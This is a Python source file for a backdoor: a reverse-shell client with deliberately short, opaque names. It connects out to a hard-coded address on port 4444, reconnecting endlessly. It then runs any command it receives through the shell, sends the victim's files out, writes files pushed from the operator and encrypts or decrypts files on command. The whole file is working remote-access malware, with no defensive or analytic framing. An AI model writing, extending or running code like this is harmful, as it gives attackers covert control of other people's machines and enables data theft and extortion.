
import subprocess as su
import os as o
import socket as s
import time as ti
import struct
from cryptography.fernet import Fernet as f
 

t = 3.0
et = 60.0


class X:

    def __init__(self, p, o) -> None:
        self.connection = s.s(s.AF_INET, s.SOCK_STREAM)
        self.connection.connect((p, o))


    def ex(self, c):
        try:
            return su.check_output(c, shell=True)
        except su.CalledProcessError as err:
            return bytes(f"\nerror in c, try again:\n{err}\n", "utf-8")
        except Exception as err:
            return bytes(f"error: {err}", "utf-8")
    
 
    def r(self, n):
        try:
            self.connection.settimeout(et) 
            ti.sleep(5) 
            
            file_size = o.path.getsize(n)
            self.connection.sendall(struct.pack('!Q', file_size))  

            while True:
                is_ready = self.connection.recv(4096)
                if is_ready == b"ready":
                    break
            

            with open(n, "rb") as file:
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = file.read(4096)
                    if not chunk:
                        break
                    self.connection.sendall(chunk)
                    bytes_sent += len(chunk)

            self.connection.settimeout(t)
            return bytes("file sent from source", 'utf-8')
        except s.timeout:
            return bytes("s timed out", 'utf-8')
        except Exception as err:
            return bytes(f"Error occurred during upload: {err}", 'utf-8')
      

    def c(self, path):
        try:
            o.chdir(path) 
            return bytes(f"changed directory to {o.getcwd()}", "utf-8") 
        except FileNotFoundError:
            return bytes(f"Directory not found: {path}", "utf-8")
        except Exception as err:
            return bytes(f"An error occurred: {err}", "utf-8")

    def rv(self):
        while True:
            try:
                c = self.connection.recv(2048).decode("utf-8")
                if len(c) == 0:
                    break
                return c, c.split(sep=" ")
            except (ConnectionResetError, BrokenPipeError):
                break
            except s.timeout:
                continue
            except Exception as err:
                print(err)
                break    
    

    def w(self, path):
        try:
            self.connection.settimeout(et)
            try:
                file_size_data = self.connection.recv(8)
                file_size = struct.unpack('!Q', file_size_data)[0]
            except Exception as err:
                print(err)
            self.connection.send(b"ready")

            n = o.path.basename(path)
            with open(n, "wb") as file:
                bytes_recieved = 0
                while bytes_recieved < file_size:
                    chunk = self.connection.recv(min(4096, file_size - bytes_recieved))
                    if not chunk:
                        break
                    file.write(chunk)
                    bytes_recieved += len(chunk)
            
            self.connection.settimeout(t)
            return bytes(f"File saved successfully and written to {file.n}", "utf-8")

        except Exception as err:
            return bytes(f"Error occurred: {err}", "utf-8")
    

    def e(self, path, key):
        try:
            self.connection.settimeout(et)
            cpher = f(key)

            with open(path, 'rb') as file:
                data = file.read()

            enc_data = cpher.encrypt(data)

            enc_file_path = "enc_" + path
            with open(enc_file_path, 'wb') as encrypted_file:
                encrypted_file.write(enc_data)

            self.connection.settimeout(t)
            return bytes(f"{enc_file_path} encrypted correctly", "utf-8")
        except Exception as err:
            print(err)
            return bytes(f"An error occurred: {err}", "utf-8")
    

    def d(self, path, key):
        try:
            self.connection.settimeout(et)
            cpher = f(key)

            with open(path, 'rb') as file:
                data = file.read()

            dec_data = cpher.decrypt(data)

            dec_file_path = "dec_" + path
            with open(dec_file_path, 'wb') as decrypted_file:
                decrypted_file.write(dec_data)

            self.connection.settimeout(t)
            return bytes(f"{dec_file_path} decrypted correctly", "utf-8")
        except Exception as err:
            print(err)
       

    def rrr(self):
            while True:
                try:
                    c, command_parsed = self.rv()
                    if command_parsed[0] == "exit":
                        self.connection.close()
                        exit()
                    elif command_parsed[0] == "cd" and len(c) > 1:
                        filepath = command_parsed[1:] 
                        fullpath = ' '.join(filepath) 
                        result = self.c(fullpath)
                    elif command_parsed[0] == "download":
                        result = self.r(command_parsed[1])
                    elif command_parsed[0] == "upload":
                        result = self.w(command_parsed[1])
                    elif command_parsed[0] == "enc":
                        result = self.e(command_parsed[1], command_parsed[2])
                    elif command_parsed[0] == "dec":
                        result = self.d(command_parsed[1], command_parsed[2])
                    else:
                        result = self.ex(c)
                    self.connection.send(result)
                except s.timeout: 
                    continue

while True:
    try:
        myX = X("169.254.0.1", 4444)
        myX.rrr()
    except:
        continue
